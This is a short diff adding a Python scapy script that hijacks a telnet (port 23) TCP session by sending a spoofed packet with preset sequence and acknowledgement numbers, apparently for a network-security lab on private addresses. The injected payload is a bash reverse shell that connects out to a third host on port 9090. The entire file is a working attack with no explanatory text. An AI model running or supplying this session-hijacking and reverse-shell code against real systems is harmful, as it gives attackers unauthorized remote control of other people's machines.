@@ -1,0 +1,15 @@
+#!/usr/bin/python
+from scapy.all import *
+
+
+v_src_port = 58302 # Host A's source port
+v_seq =  46960934     
+v_ack = 1175209400     
+
+ip = IP(src="172.18.197.189", dst="172.18.197.51")
+tcp = TCP(sport=v_src_port, dport=23, flags="A", seq=v_seq, ack=v_ack)
+
+cmd = "\r\n /bin/bash -i > /dev/tcp/172.18.197.220/9090 0<&1 2>&1 \r\n"
+
+pkt = ip/tcp/cmd
+send(pkt, verbose=0)
